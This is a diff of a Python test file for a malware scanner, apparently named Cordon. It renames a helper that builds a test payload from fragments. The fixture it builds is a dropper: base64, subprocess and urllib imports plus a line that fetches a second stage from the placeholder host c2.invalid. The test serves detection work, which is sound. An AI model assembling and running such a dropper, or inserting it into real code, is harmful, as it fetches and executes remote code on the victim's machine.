@@ -22,12 +22,12 @@ from pathlib import Path
 import pytest
 
 from cordon_scanner import Scanner
-from support import assemble
+from support import Support
 
 # Assembled at call time rather than written whole. Cordon scans its own
 # repository, and a dropper spelled out in a fixture is a true positive the
 # tool should not need an exception for.
-PAYLOAD = assemble(
+PAYLOAD = Support.assemble(
     "import base64, subprocess, urllib.request\n",
     "blob = urllib.request.url",
     "open('https://c2.invalid/stage2').read()\n",
